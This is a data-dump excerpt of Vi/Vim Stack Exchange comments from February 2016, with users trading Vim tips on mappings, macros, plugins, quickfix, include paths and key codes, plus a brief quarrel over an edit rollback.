  <row Id="10632" PostId="6637" Score="0" Text="You rolled back my edit and then re-did almost every change I made, and still managed to keep mistakes. What was the point?" CreationDate="2016-02-24T16:35:34.000" UserId="205" />
  <row Id="10633" PostId="6660" Score="1" Text="`:autoread` reads in the external changes but in the event that changes are made to the file that is being automatically read, vim will notify me that there have been changes made externally to the file since I have made my internal edits. I am looking for a way to merge the external changes with the internal ones." CreationDate="2016-02-24T16:59:16.947" UserId="2062" />
  <row Id="10635" PostId="6654" Score="0" Text="Rather than jumping back and forth, you can also just delete the line into the black hole: `D&quot;_ddNp` as the macro. (Although I understand you might want to be back where you removed the line when the macro is done.)" CreationDate="2016-02-24T17:28:35.843" UserId="6430" />
  <row Id="10636" PostId="6638" Score="0" Text="From my tests it should. I don't use Windows often however and I have never gotten any feedback for that. That is the reason for the readme. It also depends on the what method you use." CreationDate="2016-02-24T18:20:33.530" UserId="71" />
  <row Id="10637" PostId="6665" Score="3" Text="Related: http://vi.stackexchange.com/q/239/205 - you can probably adapt one of those to use a check for extensions (or lack thereof) instead of checking the directory." CreationDate="2016-02-24T18:56:43.833" UserId="205" />
  <row Id="10638" PostId="6654" Score="0" Text="@statox: to avoid the dependance on the search register, maybe have the macro contain : `?{  *}` instead of: `N`" CreationDate="2016-02-24T19:13:52.760" UserId="1289" />
  <row Id="10639" PostId="6654" Score="0" Text="@dash-tom-bang: You're right, I just assumed that it would be better to go back to the line where you started the macro but it all depends on you're workflow :)" CreationDate="2016-02-24T19:50:55.387" UserId="1841" />
  <row Id="10640" PostId="6654" Score="0" Text="@OlivierDulac: Yup I wanted to keep the macro more simple but it is possible to make the search within the macro." CreationDate="2016-02-24T19:52:43.747" UserId="1841" />
  <row Id="10642" PostId="6658" Score="0" Text="Just to be clear, are you putting your version of html.vim into ~/.vim/ftplugin or somewhere else?" CreationDate="2016-02-24T20:18:47.653" UserId="6430" />
  <row Id="10643" PostId="6660" Score="5" Text="Are you looking for `:h :DiffOrig`?" CreationDate="2016-02-24T20:29:36.890" UserId="71" />
  <row Id="10644" PostId="6613" Score="0" Text="are you sure it is a duplicate?" CreationDate="2016-02-24T21:48:51.020" UserId="5919" />
  <row Id="10645" PostId="6666" Score="1" Text="`:browse :r ~/.vim` works just fine for me." CreationDate="2016-02-24T21:59:08.800" UserId="71" />
  <row Id="10646" PostId="6666" Score="2" Text="Huh. For me it returns http://i.imgur.com/V8Yj1t7.png" CreationDate="2016-02-24T22:09:41.260" UserId="2082" />
  <row Id="10647" PostId="6668" Score="0" Text="This also chokes if any of your filenames have colons in them but that sort of thing should be easy to tweak for platform specifics." CreationDate="2016-02-24T22:50:44.227" UserId="6430" />
  <row Id="10648" PostId="6669" Score="0" Text="Oh it's worth noting that this actually skips `#include &lt;...&gt;` lines since those are often (in my experience) order dependent. So mostly this is for project includes, still arranged in sets if necessary that are separated by blank lines or comments or whatever." CreationDate="2016-02-24T23:02:45.180" UserId="6430" />
  <row Id="10649" PostId="6640" Score="1" Text="Editing files inside of the Program Files hierarchy for instance, `:w!` doesn't fly and you *must* run gVim as an administrator or run Vim in an command prompt that was run as administrator." CreationDate="2016-02-24T23:14:37.860" UserId="6430" />
  <row Id="10650" PostId="6648" Score="0" Text="@muru I don't think that it is a solution for my problem... All I want is to edit a file on Machine_2 using Vim and the configuration files located on &quot;Machine_0&quot;.&#xA;@Carpetsmoker It is not really about SSH, I believe. What I am asking is if there a way to do something similar to `vim scp://name@Machine_2:122//home/myfile.txt` direct from Machine_0" CreationDate="2016-02-24T23:29:23.550" UserId="6558" />
  <row Id="10651" PostId="4773" Score="0" Text="If you do it like Peter suggests and end up with a trailing whitespace, there are plugins like DeleteTrailingWhitespace which can eliminate them automatically." CreationDate="2016-02-25T00:04:41.883" UserId="6495" />
  <row Id="10652" PostId="6666" Score="1" Text="@ChristianBrabandt On Linux, it's only available when used with the GUI." CreationDate="2016-02-25T01:22:56.190" UserId="205" />
  <row Id="10653" PostId="6648" Score="0" Text="@Xaphanius it is. When you do `vim scp://`, Vim is using SSH to connect to the target system. And how SSH connects to it is, of course, governed by your SSH settings. So, if you configure SSH so that you can SSH to Machin_2 from Machine_0, Vim will follow." CreationDate="2016-02-25T02:01:15.553" UserId="205" />
  <row Id="10655" PostId="6676" Score="2" Text="It seems to have some sort of template support. See https://github.com/thinca/vim-quickrun/blob/master/doc/quickrun.txt#L655, maybe you could use that." CreationDate="2016-02-25T06:47:38.653" UserId="205" />
  <row Id="10656" PostId="6666" Score="0" Text="I thought we are talking about the gui here." CreationDate="2016-02-25T06:49:33.190" UserId="71" />
  <row Id="10657" PostId="6674" Score="0" Text="In hindsight, the source of the problem should have been obvious, what with the pattern I was seeing. I suppose it just never occurred to me that vim might bother to deal with any base other than decimal. That printf statement is amazing too. I have much to learn." CreationDate="2016-02-25T08:19:36.680" UserId="6573" />
  <row Id="10658" PostId="6629" Score="0" Text="Ok, I'm on QWERTY now.. I decided to go with AltGr+[a|o|u] for 'umlauts'.. Thanks for the tip! :-)" CreationDate="2016-02-25T08:40:05.017" UserId="6542" />
  <row Id="10659" PostId="6222" Score="0" Text="I can't find any references to `dbus` in the Vim source tree, so I'm not sure where this error is coming from... I suspect it's coming from `libgnome` or some such... At any rate, I think you're better off asking this on [unix.SE](http://unix.stackexchange.com) or [Super User](http://superuser.com)." CreationDate="2016-02-25T08:42:10.273" UserId="51" />
  <row Id="10660" PostId="6674" Score="0" Text="Oh. Just a small quibble, in that the printf statement seems to treat the backslashes as literals, which left all the `&lt;a&gt;` tags unclosed. Easy enough to fix" CreationDate="2016-02-25T08:47:09.470" UserId="6573" />
  <row Id="10661" PostId="6674" Score="0" Text="@FitzmorrisPR Oh, yeah, I used single-quoted strings, so I needn't have escaped the `/`." CreationDate="2016-02-25T08:48:27.633" UserId="205" />
  <row Id="10662" PostId="6674" Score="0" Text="@FitzmorrisPR Guess I was mistaken. I had to use double quotes for the format string, and escape the `/` before it worked correctly (or use a character other than `/` to separate `:s`'s patterns)." CreationDate="2016-02-25T08:51:31.383" UserId="205" />
  <row Id="10663" PostId="6664" Score="0" Text="But where should the `project.properties` file supposed to be?" CreationDate="2016-02-25T09:29:55.470" UserId="6380" />
  <row Id="10664" PostId="6142" Score="0" Text="Not really helpful but I know it also happened to me on a Debian Wheezy with a Vim 7.4 and a rxvt terminal. I noticed it only on HTML with JS inside it too. But the problem seemed really random and didn't happened to often so I didn't investigated it. Also I don't have access to this system anymore so this comment is just to report that this could not be an isolated bug." CreationDate="2016-02-25T09:38:19.783" UserId="1841" />
  <row Id="10665" PostId="6668" Score="0" Text="Do you have a succinct argument for why this can't be done via `errorformat`? It would benefit the quality of the answer. I think I came to the same conclusion when I last looked into this but it's been a while so I forget if I had a clear and concrete reason for believing that." CreationDate="2016-02-25T10:29:12.913" UserId="268" />
  <row Id="10666" PostId="6669" Score="0" Text="IMHO, include files should NOT be order dependent. If they are, then you should make this explicit by having one .H file include each other. Alphabetical sorting of include files is also part of style guides, e.g., Google's" CreationDate="2016-02-25T11:01:18.713" UserId="5919" />
  <row Id="10667" PostId="6680" Score="1" Text="nice reference, that trilogy of five books is awesome :)" CreationDate="2016-02-25T11:21:15.523" UserId="1405" />
  <row Id="10668" PostId="6664" Score="0" Text="On the main folder from your project http://www.compiletimeerror.com/2013/01/directorystructure-of-android-project.html#.Vs7wZHom1uY" CreationDate="2016-02-25T12:16:43.350" UserId="177" />
  <row Id="10669" PostId="6680" Score="1" Text="That explains the difference between :make and :!make, thanks! With that explanation it was easy to prepend aspell with screen so this behaviour can be avoided since I do not want to include the aspell output in the errorfile anyway. Anyhow it would be interesting why &quot;|&amp; tee&quot; modifies the terminal width (and &quot;| tee&quot; not, by the way...)." CreationDate="2016-02-25T12:47:15.777" UserId="6584" />
  <row Id="10670" PostId="6680" Score="1" Text="@koalo aspell might be testing if either of stderr or stdin is connected to a TTY and using to get the display size, etc. (`aspell -c foo 2&gt;bar` works fine too). That would be a question for [unix.se], however :)" CreationDate="2016-02-25T12:50:48.030" UserId="205" />
  <row Id="10671" PostId="6676" Score="0" Text="@muru +1 thank you very much for your help." CreationDate="2016-02-25T12:56:07.363" UserId="3302" />
  <row Id="10672" PostId="6677" Score="1" Text="+1 Thank you, thank you, thank you very much. I just had to change QuickRun to execute &quot;'&lt;,'&gt;QuickRun&quot; or I would get an error &quot;PHP Parse error:  syntax error, unexpected '&lt;' in /tmp/vduL2VG/10 on line 5&quot;  Again, thank you very much. It does work great." CreationDate="2016-02-25T12:59:01.877" UserId="3302" />
  <row Id="10673" PostId="6681" Score="4" Text="Not for me. Can you reproduce this behaviour with `vim -Nu NONE`? If not, it might be a plugin or mapping at work." CreationDate="2016-02-25T13:27:18.880" UserId="205" />
  <row Id="10674" PostId="6640" Score="1" Text="Thanks @dash-tom-bang, I've added reference to that good example in my answer." CreationDate="2016-02-25T13:55:15.937" UserId="6298" />
  <row Id="10675" PostId="6681" Score="1" Text="If you can, include the output of `:verb imap &lt;C-w&gt;` in your post. If a plugin has modified the behavior of `&lt;C-w&gt;`, maybe its filename will appear." CreationDate="2016-02-25T14:38:04.360" UserId="4939" />
  <row Id="10676" PostId="6681" Score="0" Text="@saginaw: Adding `:verb` in front of a `map` command to see where was the mapping made is a pretty cool trick! I don't remember seeing something like this on this site maybe that would be worth a self-answered question or something like that." CreationDate="2016-02-25T15:10:44.960" UserId="1841" />
  <row Id="10677" PostId="6681" Score="0" Text="@statox Thank you very much ! But I think the question / answer has already been done here: http://vi.stackexchange.com/a/279/4939" CreationDate="2016-02-25T15:20:52.357" UserId="4939" />
  <row Id="10678" PostId="6681" Score="0" Text="Thanks for hints! Works as intended. This was my misinterpretation of `iskeyword`. Posted an answer just in case someone makes the same mistake." CreationDate="2016-02-25T15:41:53.590" UserId="6517" />
  <row Id="10679" PostId="6682" Score="0" Text="Maybe I was unclear. When I said, not for me, I meant that `&lt;c-w&gt;` did delete only up to `-`, it did not delete all of it." CreationDate="2016-02-25T17:19:36.580" UserId="205" />
  <row Id="10680" PostId="6686" Score="5" Text="You might find `:help :fixdel` interesting." CreationDate="2016-02-25T17:19:58.620" UserId="54" />
  <row Id="10681" PostId="6668" Score="0" Text="The first sentence is my succinct answer as to why it's not possible. `errorformat` requires a line number for the jump and the linker error doesn't have one." CreationDate="2016-02-25T17:24:46.163" UserId="6430" />
  <row Id="10682" PostId="6669" Score="1" Text="That's a nice opinion to have and it's my preference too but I have better things to do than make Adobe, Microsoft, and other corporations bow to my preferences." CreationDate="2016-02-25T17:27:05.533" UserId="6430" />
  <row Id="10683" PostId="6686" Score="0" Text="I went into insert mode and did a Control + V and all it inserted was ^  When I hit backspace it inserted a ?  I then put map! &lt;C-?&gt; &lt;BS&gt; into my .exrc and it did not help.  Have I put the correct thing in my .exrc?" CreationDate="2016-02-25T17:30:44.933" UserId="6587" />
  <row Id="10684" PostId="6686" Score="1" Text="The &lt;C-h&gt; mapping means Ctrl+h. By the same token &lt;C-?&gt; means Ctrl+?. This is not quite what you want since VI didn't output a &quot;^?&quot;. Which ALSO means Ctrl+?. Confusing, I know. Based on the context the notation changes. Since it output only a ? I will direct you to the same place that @romainl directed me. In `:help :fixdel` it says:&#xA;Note about Linux: By default the backspace key produces CTRL-?, which is wrong. You can fix is by putting this line in your rc.local:&#xA;echo &quot;keycode 14 = BackSpace&quot; | loadkeys.&#xA;&#xA;Note, I haven't tried this as I'm not on a Linux machine ATM." CreationDate="2016-02-25T17:39:02.383" UserId="6489" />
  <row Id="10685" PostId="6682" Score="0" Text="If I fire up `vim -Nu NONE`, then `-` is not in `iskeyword` and vim does not delete `word-word-word` at once but only the last `word` up to `-`. But in my question I used `iskeyword` **with** `-` and I wondered why this deletes all of it." CreationDate="2016-02-25T18:14:42.723" UserId="6517" />
  <row Id="10686" PostId="6684" Score="1" Text="I may be wrong, but I think the problem comes from the `input()` function, not the completion function. When you write a completion function for a command, you can tell the latter that it must wait for several arguments thanks to the attribute `-nargs=+`. I don't think there's something equivalent for `input()` which is probably why it will always send the whole command line as an argument to the completion function. Maybe you could make 3 distinct calls to `input()`: http://vpaste.net/FovYz and build `user` afterwards." CreationDate="2016-02-25T20:11:05.077" UserId="4939" />
  <row Id="10687" PostId="6684" Score="0" Text="Otherwise, your completion function would have several problems to solve. If `input()` can only complete the whole command line, your completion function will have to return not just the completion of an argument, but the whole command. Besides, at the moment, your completion function chooses which candidates to return based on the number of &quot;words&quot; on the line (`if len(argList) == 1`), but to work properly I think it should also take into account the position of the cursor. That problem seems to be solved in the link you gave though." CreationDate="2016-02-25T20:33:01.590" UserId="4939" />
  <row Id="10688" PostId="6669" Score="0" Text="good point @dash-tom-bang" CreationDate="2016-02-25T21:27:11.743" UserId="5919" />
  <row Id="10689" PostId="6688" Score="6" Text="Your question is currently too broad, do you have any language in mind ? have you tried anything right now ?" CreationDate="2016-02-25T22:01:01.803" UserId="1453" />
  <row Id="10690" PostId="6688" Score="1" Text="Updated my question. I have not tried anything within vim for refactoring. I have tried youcompleteme and syntastic plugins, among others that don't seem as worthwhile mentioning. I have also tried tagbar and such." CreationDate="2016-02-25T22:56:40.807" UserId="6452" />
  <row Id="10691" PostId="6688" Score="0" Text="Since you're asking for a plugin recommendation, please follow [Software Recommendations' guidelines](http://meta.softwarerecs.stackexchange.com/questions/336/what-is-required-for-a-question-to-contain-enough-information) in framing your question." CreationDate="2016-02-26T03:10:20.453" UserId="205" />
  <row Id="10692" PostId="6684" Score="0" Text="It would help if you could be more specific. Especially regarding how you want to use this. Based on the first part of the question, I get the impression that you are defining a command, e.g. with `command -complete ...`. Later, I understand this is not the case, and it gets confusing. Can you explain how the tool should be used when it works as expected?" CreationDate="2016-02-26T06:59:09.953" UserId="21" />
  <row Id="10695" PostId="6637" Score="0" Text="I rolled it back because you have changed the tags. But looks like you did the same and I'm too tired to play the same game again. And, BTW, there were no mistakes in that." CreationDate="2016-02-26T09:10:00.063" UserId="5481" />
  <row Id="10696" PostId="6637" Score="1" Text="Don't play games, then. You did use inappropriate tags, and missed the question mark in the title. [tag:vim-windows] is for the concept of windows in Vim, and not for MS Windows, which you would know if you'd bothered to read the tag description instead of rolling back my edit and wasting my time." CreationDate="2016-02-26T09:13:24.267" UserId="205" />
  <row Id="10697" PostId="6637" Score="0" Text="I am not playing games. You win. I should have read the description" CreationDate="2016-02-26T09:14:41.110" UserId="5481" />
  <row Id="10698" PostId="6637" Score="0" Text="Alright, then. Learn to use tags better next time." CreationDate="2016-02-26T09:15:20.283" UserId="205" />
  <row Id="10699" PostId="6691" Score="2" Text="See this answer: http://unix.stackexchange.com/a/11848 for a custom function (and command) that does what you want. Adjust to your taste." CreationDate="2016-02-26T11:52:51.533" UserId="1800" />
  <row Id="10700" PostId="6692" Score="0" Text="When did you last update YCM?" CreationDate="2016-02-26T13:37:02.477" UserId="205" />
  <row Id="10701" PostId="6692" Score="0" Text="@muru Last month" CreationDate="2016-02-26T13:40:10.990" UserId="2514" />
  <row Id="10702" PostId="6692" Score="0" Text="Python3 completion support was also added [last month](https://github.com/Valloric/ycmd/pull/295), so perhaps your last update was before that? If it wasn't, please report it as an issue on YCM's Github issue tracker." CreationDate="2016-02-26T13:49:30.983" UserId="205" />
  <row Id="10704" PostId="6692" Score="0" Text="@muru Let me update it again. If it has the same problem, I will report it..Thanks" CreationDate="2016-02-26T13:51:24.557" UserId="2514" />
  <row Id="10705" PostId="6693" Score="4" Text="(by learning Vim. &quot;This is a simple question&quot;) :) E.g if you visually selected &quot;is a&quot;, now you do `y` to yank it, then: `:%s/` `Ctrl-r` `&quot;` `/is not a/g` to substitute with `is not a`. `Ctrl-r` `&quot;` will paste `is a` from the default register into the substitute command." CreationDate="2016-02-26T15:07:58.620" UserId="1800" />
  <row Id="10706" PostId="6693" Score="1" Text="@le0m You want a mapping in visual mode which replaces the visual selection with an arbitrary string ? If so you could try this: `xnoremap ,s y:&lt;C-U&gt;let replacement = input('Enter replacement string: ') &lt;bar&gt; %s/&lt;C-R&gt;&quot;/\=replacement/g&lt;CR&gt;` (Here the mapping is `,s` but you could change it to what you want)." CreationDate="2016-02-26T15:13:06.487" UserId="4939" />
  <row Id="10707" PostId="6694" Score="0" Text="(no problem from my part) :)" CreationDate="2016-02-26T15:19:37.373" UserId="1800" />
  <row Id="10708" PostId="6694" Score="1" Text="@VanLaser it's cool then =)" CreationDate="2016-02-26T15:20:36.827" UserId="1841" />
  <row Id="10709" PostId="6694" Score="0" Text="Thanks for the answer! I did know about :%s from the tut file. But the bit with ctrl+r and &quot; remains a mystery :-\ How do I get info out of :h about it?" CreationDate="2016-02-26T15:27:06.107" UserId="6542" />
  <row Id="10710" PostId="6694" Score="2" Text="`:h c_CTRL-R` (`c_` comes from command-line mode, `CTRL-R` is the way you specify a combo when using help). See also `:h i_CTRL-R` (for the similar operation in insert mode), and `:h registers` to see what's up with `&quot;`." CreationDate="2016-02-26T15:31:05.130" UserId="1800" />
  <row Id="10711" PostId="6691" Score="1" Text="The problem with this solution is that it can't make use of incremental search.  But `cmap &lt;m-space&gt; \_s\+` works well (in nvim)." CreationDate="2016-02-26T15:53:36.050" UserId="4505" />
  <row Id="10712" PostId="6691" Score="0" Text="Whatever floats your boat is ok :)" CreationDate="2016-02-26T17:19:40.530" UserId="1800" />
  <row Id="10713" PostId="6695" Score="0" Text="Great answer, +1 ! With a mutiline pattern, I think the last mapping wouldn't work as expected. For example, if you have a buffer containing several groups of 2 consecutive lines `foo` and `bar`, you select one of them and copy it with `y`, and type `/&lt;C-R&gt;&quot;`, instead of searching for `foo\nbar\n`, you will search for `foo^Mbar^M`, because Vim will automatically interpret `\n` as a literal carriage return whose caret notation is `^M`. At least, it seems to happen on my machine, maybe I have some wrong settings though." CreationDate="2016-02-26T18:47:20.670" UserId="4939" />
  <row Id="10714" PostId="6695" Score="0" Text="Maybe, the solution would be to protect the newline by replacing all `\n` with `\\n`: `xnoremap * :&lt;c-u&gt;let @/=@&quot;&lt;cr&gt;gvy:let [@/,@&quot;]=[@&quot;,@/]&lt;cr&gt;/\V&lt;c-r&gt;=substitute(escape(@/,'\/'),'\n','\\n','g')&lt;cr&gt;&lt;cr&gt;`" CreationDate="2016-02-26T18:47:26.043" UserId="4939" />
  <row Id="10715" PostId="6695" Score="0" Text="@saginaw I have tested and changed the mapping. Good catch." CreationDate="2016-02-26T18:57:10.507" UserId="778" />
  <row Id="10716" PostId="6684" Score="0" Text="Sorry, I try not to bore people with details that I don't think help solve the problem. The context is that I'm designing a &quot;package manager&quot; within vim for multiple directory projects. This tool will make it easier for me to search within a predefined set of directories easily (And don't tell me there's a plugin for it. I wanted to write it myself :).&#xA;&#xA;This issue comes up in the tool to edit the packages. Once the tool is activated via a user command, the user is then prompted (via an input() ) for a command. They can also supply optional arguments to the command. i.e. `add Foo .`" CreationDate="2016-02-26T19:43:47.177" UserId="6489" />
  <row Id="10717" PostId="6684" Score="0" Text="This will add the current directory to package Foo. Anyway I have a workaround (posted below). If you have a better answer feel free to post it, but I can work with what I've got for now." CreationDate="2016-02-26T19:46:08.313" UserId="6489" />
  <row Id="10718" PostId="6686" Score="0" Text=":help or :help :fixdel return &quot;help: not an editor command&quot;.  If I login and press bs in terminal it will output ^? in VI when I hit backspace.  However even with it outpitting ^? in VI + the mapping, it still didn't delete.  To get to the help you are merely typing :help after hitting escape?  I think this machine is so old it may not have a help file." CreationDate="2016-02-27T03:15:35.733" UserId="6587" />
  <row Id="10719" PostId="6701" Score="1" Text="Related: [How to yank a line with a certain line number?](http://vi.stackexchange.com/q/3231/51) And instead of using yank &amp; put, you can probably use the `:move` command." CreationDate="2016-02-27T09:18:27.123" UserId="51" />
  <row Id="10720" PostId="6675" Score="0" Text="There is a problem with this, it creates `bird.tex` if you typ `vi bird` at the cmdline." CreationDate="2016-02-27T13:52:39.600" UserId="4505" />
  <row Id="10721" PostId="6675" Score="0" Text="@Lawrence Is that a problem? I would have thought that expected behaviour." CreationDate="2016-02-27T13:53:56.397" UserId="205" />
  <row Id="10722" PostId="6675" Score="0" Text="Oh, sorry, my q. wasn't quite clear.  I wanted to open `bird.tex` unless `bird` existed, but not create a texfile when neither `bird` nor `bird.tex` existed from before.  When I think about it, maybe this was just a bad idea: I also want to be able to create `bird` even though `bird,tex` exists. Sorry!" CreationDate="2016-02-27T14:00:13.973" UserId="4505" />
  <row Id="10723" PostId="6675" Score="1" Text="@Lawrence then it is a bad idea, since you want to do both A and not A." CreationDate="2016-02-27T14:01:09.800" UserId="205" />
  <row Id="10724" PostId="5499" Score="0" Text="Have you tried setting `makeprg=gcc\ -g\ %` instead? The `-g` usually enables enough debug information for the linker to generate line numbers in cases like your example, and then Vim can usually process the output for quickfix." CreationDate="2016-02-27T15:12:04.400" UserId="227" />
  <row Id="10725" PostId="6434" Score="2" Text="Sounds like you have a mapping that starts with &lt;c-y&gt; somewhere.  I suspect the delay is Vim timing out waiting for the rest of the mapping. Have you tried disabling plugins and settings that you don't need as a minimal working example? See http://meta.vi.stackexchange.com/questions/98/how-to-include-vimrc-for-analyze/100#100 for hints on debugging." CreationDate="2016-02-27T16:02:58.713" UserId="227" />
  <row Id="10726" PostId="6710" Score="0" Text="Thank you, this is exactly what I've been looking for!" CreationDate="2016-02-27T16:54:21.680" UserId="6605" />
  <row Id="10727" PostId="6702" Score="1" Text="If you want to duplicate a line, you could also use the `:t` command. To copy the 5th line above you under the current one, you would type: `:-5t.` To copy the 10th line under you above the current one, you would type: `:+10t-1` The number before the `:t` command gives the position of the line you want to copy relative to the current one, while the number after it gives the position of the line under which you want to paste." CreationDate="2016-02-27T17:36:34.933" UserId="4939" />
  <row Id="10728" PostId="5950" Score="1" Text="@nightire Did you ever find the problem?" CreationDate="2016-02-27T18:29:16.317" UserId="227" />
  <row Id="10730" PostId="5867" Score="2" Text="Have you checked out `:nbstart` and `:help netbeans` for Vim's existing netbeans integration?" CreationDate="2016-02-27T18:35:39.230" UserId="227" />
  <row Id="10731" PostId="6712" Score="0" Text="Thank you. This is interesting. I will take another look at neovim. Unfortunately, the command sometimes (rarely) does hang when I've configured things wrong, so the `python` trick isn't an option, but it's very good to know about the difference between [cooked mode](https://en.wikipedia.org/wiki/Cooked_mode) and raw mode." CreationDate="2016-02-27T21:12:57.470" UserId="142" />
  <row Id="10732" PostId="6434" Score="0" Text="@JohnO'M. thanks this looks promising. I have tried a core install of vim with only a handful of basic plugins, and the lag has actually gone away! so as you say, I will now try to systematically add the plugins back in to discover the plugin that that is causing the issue." CreationDate="2016-02-27T23:53:31.060" UserId="4603" />
  <row Id="10734" PostId="6716" Score="2" Text="The answer would depend on the snippet engine you're using. With mu-template you could have include one snippet from another, copy the snippet file under a different name or just create a symbolic link. I'm not sure the other engines could permit it. May be if some day they come to support snippet inclusion from &quot;caller&quot; snippets.&#xA;&#xA;Perhaps you could define the core of your snippet in a python or viml function and have your snippets call the same function?" CreationDate="2016-02-28T04:08:10.557" UserId="626" />
  <row Id="10735" PostId="6716" Score="3" Text="The question is tagged as `plugin-ultisnips`, so I would assume the OP is using ultisnips." CreationDate="2016-02-28T11:14:54.317" UserId="865" />
  <row Id="10736" PostId="6716" Score="0" Text="My mistake ^^'&#xA;(µTemplate isn't better, just very different, older, and more suited toward my needs (I'm maintaining it): I've root snippets that behave as functions that I can call with different options to produce different but very close things.Eg in C++ I have snippets for base-class, value-class, exception-class... that all depend on the same set of class-snippet+function-snippet+... But as I told, the syntax is completely different, and the placeholder feature is less ergonomic than the one you're used to. Doing what you're looking for would be easy, but not necessity worth a migration)" CreationDate="2016-02-28T12:16:10.453" UserId="626" />
  <row Id="10737" PostId="6717" Score="3" Text="Because there is no way to know when you are *inside* the pattern, or *between* two other `%`-delimited regions? You could use something like this, perhaps: https://github.com/kana/vim-textobj-syntax" CreationDate="2016-02-28T12:23:34.100" UserId="1800" />
  <row Id="10738" PostId="6717" Score="0" Text="@VanLaser, yes, but maybe it could assume that one is inside, behave like the paragraph object." CreationDate="2016-02-28T12:30:46.007" UserId="4505" />
  <row Id="10739" PostId="6717" Score="0" Text="It could, but AFAIK it doesn't. I think if it finds the starting pattern, it simply doesn't 'move' the selection to the end pattern, if it's the same one." CreationDate="2016-02-28T12:41:50.850" UserId="1800" />
  <row Id="10740" PostId="6717" Score="0" Text="I *think* that it first searches before the cursor for the start pattern, then searches the end pattern, and it cancels selection if the end pattern is not *after* the original cursor position. But I don't have the patience to look into the code, feel free to do so :)" CreationDate="2016-02-28T12:59:12.177" UserId="1800" />
  <row Id="10746" PostId="6715" Score="0" Text="Looks like the plugin supports changing &lt;c-y&gt; to something else like so: `let g:user_emmet_leader_key='&lt;C-Z&gt;'` in your vimrc. Would be a good way to keep the plugin simply while avoiding the lag." CreationDate="2016-02-28T21:48:07.747" UserId="227" />
  <row Id="10747" PostId="6715" Score="0" Text="@JohnO'M. nice find. Im just so happy to get rid of that lag, That lag and another lag switching to normal mode were the cause of many errors and frustration - which were making me question modal editing in general - with delay fixed - error rate is far lower and types of errors are less destructive too" CreationDate="2016-02-28T21:52:10.423" UserId="4603" />
  <row Id="10749" PostId="6714" Score="0" Text="@saginaw: `:silent! make | redraw! | cw` is a great solution and is what I will use. Please post it as an answer (so that you get reputation and the vi/Vim site stats on Area51 get better) and I will happily accept it. It would be great if you could also mention a way how I could delete the `.o` file automatically after compilation, as the `autocmd` in my answer that deletes the object file does not work with the `:silent! make | redraw! | cw` command: the quickfix list is empty and does not contain errors." CreationDate="2016-02-28T23:00:56.323" UserId="3282" />
  <row Id="10751" PostId="6718" Score="2" Text="What is the output if you run `:set complete?`? If there is no `i` for searching included files for autocompletion, adding `set complete+=i` in your `_vimrc` might help. Does your problem happen with exactly the same `vimrc` file on Linux and Windows? Also, do you by chance happen to use tpope's sensible.vim?" CreationDate="2016-02-28T23:14:43.957" UserId="3282" />
  <row Id="10752" PostId="6714" Score="0" Text="Sorry I removed my comments because I thought they didn't solve your issue, but I'm glad if they helped you a little! I'm not comfortable writing an answer because I can't reproduce what you're experiencing on my machine, and I don't know how compilation or Pascal works. To remove automatically the `.o` file, maybe you could look at `:h autocmd-events` and see if there's an event which corresponds to a compilation. Maybe `QuickFixCmdPre` or `QuickFixCmdPost`? That would give something like `autocmd QuickFixCmdPost * !rm\ -f\ %:r.o` I didn't try it so it may not work as expected." CreationDate="2016-02-28T23:18:13.730" UserId="4939" />
  <row Id="10753" PostId="6714" Score="0" Text="Sorry again, I read your comment too quickly. You say the quickfix list is empty so the events I mentioned won't work. Maybe `ShellCmdPost` then? You could also install a fire-once autocmd (the autocmd is installed and removed as soon as the command is executed) inside a function and call the latter from a mapping `,c` or a custom command `:CP`: http://vpaste.net/0t1i4" CreationDate="2016-02-28T23:34:33.090" UserId="4939" />
  <row Id="10754" PostId="6714" Score="0" Text="The previous code won't work because I mixed a shell and Vim command on the same line. Maybe this will work, but I'm not really sure: http://vpaste.net/DhNQG" CreationDate="2016-02-28T23:46:02.693" UserId="4939" />
  <row Id="10756" PostId="6714" Score="0" Text="@saginaw: I have a working solution now, thanks again for your help :)" CreationDate="2016-02-29T01:29:17.983" UserId="3282" />
  <row Id="10757" PostId="6718" Score="0" Text="@cbaumhardt No I don't use the same vimrc file on Linux and Windows, because on windows I add something like `behave mswin`. But besides those operating-system related directives, all other are the same. And I am not using `sensible.vim`. Have you ever had the same problem?" CreationDate="2016-02-29T03:18:14.987" UserId="2760" />
  <row Id="10759" PostId="3787" Score="0" Text="Very related: [How can I prevent plugins from overwriting my key mappings?](http://vi.stackexchange.com/q/3710/51)." CreationDate="2016-02-29T09:29:47.883" UserId="51" />
  <row Id="10760" PostId="6713" Score="4" Text="I'm voting to close this question as off-topic because this is not a free code-writing service. Please try to fix the problem yourself, and ask a more specific question when you get stuck on something." CreationDate="2016-02-29T09:35:36.630" UserId="51" />
  <row Id="10761" PostId="6718" Score="1" Text="What happens if you use an explicit path, instead of `$INCLUDE`, and that path is not the path to the file, but to the include *folder*? An equivalent to Linux's `/usr/include` path. Things should be OK when you can place cursor on a line such as `#include &lt;stdio.h&gt;` and `gf` can open that file." CreationDate="2016-02-29T10:30:16.640" UserId="1800" />
  <row Id="10762" PostId="6697" Score="2" Text="Sometimes the occurrence of unexpected `NULL`  characters is caused by the underlying C function that is handling the strings. This [explanation of how C processes strings](http://stackoverflow.com/questions/12876166/in-c-what-is-the-difference-between-null-character-and-a-new-line-character/12876441#12876441) that you linked to explains that internally C delimits strings with a `NULL`. `NULL`s occur rarely enough in text that it makes it a good character for this purpose. A consequence of this is that if the C program (vim) tried to pass an &quot;empty&quot; string into an internal C function" CreationDate="2016-02-29T10:39:44.780" UserId="4603" />
  <row Id="10763" PostId="6697" Score="2" Text="e.g. `someFunction(arg1, &quot;&quot;)` where arg 2 was `&quot;&quot;`   i.e. &quot;the item between the quotes, which is literally nothing - an &quot;empty&quot;. a NULL can appear, because it was &quot;added&quot; by the underlying C implementation as it delimited the string. I don't know how you would check for this - but it comes to mind as a possible cause." CreationDate="2016-02-29T10:43:50.407" UserId="4603" />
  <row Id="10764" PostId="6718" Score="1" Text="@VanLaser yes, it work." CreationDate="2016-02-29T11:24:10.523" UserId="2760" />
  <row Id="10765" PostId="1969" Score="0" Text="`vim-plug`'s README has an example saying &quot;Group dependencies&quot;. Have you tried that, or does it differ from VAM/NeoBundle's methods?" CreationDate="2016-02-29T13:43:23.887" UserId="205" />
  <row Id="10766" PostId="1969" Score="0" Text="I've missed group dependencies in vim-plug documentation. I did see that they've removed their attempt to support dependencies from the code base however. Regarding group dependencies, I don't see how it can help. Dependencies should not be declared by the end user. They should be declared by the plugin writers. If you look at by lh-cpp plugin and look closely you'll see the dependencies are not something linear. It's an oriented graph, that need to be acyclic to avoid issues." CreationDate="2016-02-29T14:37:52.143" UserId="626" />
